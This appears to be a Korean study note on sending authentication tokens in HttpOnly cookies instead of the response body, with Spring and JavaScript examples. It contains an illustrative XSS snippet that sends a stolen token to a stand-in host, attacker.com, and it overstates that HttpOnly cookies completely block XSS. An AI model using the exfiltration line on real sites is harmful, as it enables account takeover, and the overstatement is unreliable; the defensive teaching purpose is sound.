# 2. 토큰을 쿠키로 전송하기

## 질문

> **"토큰을 Response Body에 담아서 보내면 안 될까요?"**

> 💡 **스터디 전에 생각해보기**: [질문들 모음](./00-questions.md)을 먼저 확인해보세요!

**생각해볼 점:**
- Response Body에 토큰을 담아서 보내면 어떤 보안 문제가 있을까?
- JavaScript로 토큰에 접근할 수 있다면 어떤 위험이 있을까?
- 쿠키에 저장하는 것과 Body에 담아서 보내는 것의 차이는?

---

## 2.1 week1의 문제점

### week1 코드

```java
// week1: LoginResponse에 토큰을 담아서 Body로 전송
public class LoginResponse {
    private final Long userId;
    private final String token;  // ❌ Response Body에 토큰 포함
    private final Cookie cookie;
}
```

**문제점:**
- 토큰이 Response Body에 포함되어 JavaScript로 접근 가능
- XSS 공격 시 토큰 탈취 가능

---

## 2.2 JavaScript로 토큰 접근 예시

### 정상적인 사용

```javascript
// Response Body에서 토큰 추출
const response = await fetch('/api/auth/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ email: 'user@example.com', password: 'password' })
});

const data = await response.json();
const token = data.token;  // ❌ JavaScript로 접근 가능!

// LocalStorage에 저장
localStorage.setItem('token', token);
```

### XSS 공격 시나리오

```javascript
// 악의적인 스크립트가 주입된 경우
<script>
  fetch('/api/auth/login', {...})
    .then(r => r.json())
    .then(data => {
      // 악의적인 코드가 토큰을 탈취할 수 있음!
      fetch('https://attacker.com/steal?token=' + data.token);
    });
</script>
```

**결과:**
- 공격자가 사용자의 토큰을 탈취
- 사용자 계정으로 로그인 가능
- 심각한 보안 문제 발생

### 더 나은 방법: 쿠키로 전송

**제안: Access Token과 Refresh Token 모두 쿠키로 전송**

**이유:**
1. **XSS 공격 완전 차단**: HttpOnly 쿠키는 JavaScript로 접근 불가
2. **일관된 보안 정책**: 두 토큰 모두 동일한 보안 수준
3. **간단한 구현**: 쿠키만 관리하면 됨

**구현:**
- Access Token 쿠키: `access_token` (HttpOnly, Secure, SameSite)
- Refresh Token 쿠키: `refresh_token` (HttpOnly, Secure, SameSite)
- Response Body: 사용자 정보만 포함 (userId, email 등)

---

## 2.3 HttpOnly Cookie 사용

### 쿠키 설정

```java
public Cookie createCookie(String token) {
    Cookie cookie = new Cookie("auth_token", token);
    cookie.setHttpOnly(true);  // ✅ JavaScript 접근 불가
    cookie.setSecure(true);    // ✅ HTTPS에서만 전송
    cookie.setPath("/");
    cookie.setMaxAge(24 * 60 * 60); // 24시간
    // SameSite 설정은 Spring Boot에서 별도 설정 필요
    return cookie;
}
```

**쿠키 속성:**
- **HttpOnly**: JavaScript 접근 불가 (XSS 방지)
- **Secure**: HTTPS에서만 전송 (중간자 공격 방지)
- **SameSite**: CSRF 공격 방지

---

## 2.4 week2 코드 개선

### AuthController 수정

```java
@RestController
@RequiredArgsConstructor
public class AuthController implements AuthApi {

	private final AuthOrchestrator authOrchestrator;

	@Override
	public void login(LoginRequest request, DeviceInfo deviceInfo, HttpServletResponse response) {
		LoginResultWithCookies result = authOrchestrator.login(request, deviceInfo);

		// 쿠키를 Response에 추가
		response.addCookie(result.getAccessTokenCookie());
		response.addCookie(result.getRefreshTokenCookie());

		// Response Body는 비움 (쿠키만으로 충분)
	}
}
```


---

## 정리

✅ **토큰은 Response Body가 아닌 쿠키로 전송해야 한다**

✅ **HttpOnly 쿠키를 사용하여 XSS 공격을 방지한다**

✅ **Access Token과 Refresh Token 모두 쿠키로 전송하는 것이 더 안전하다**

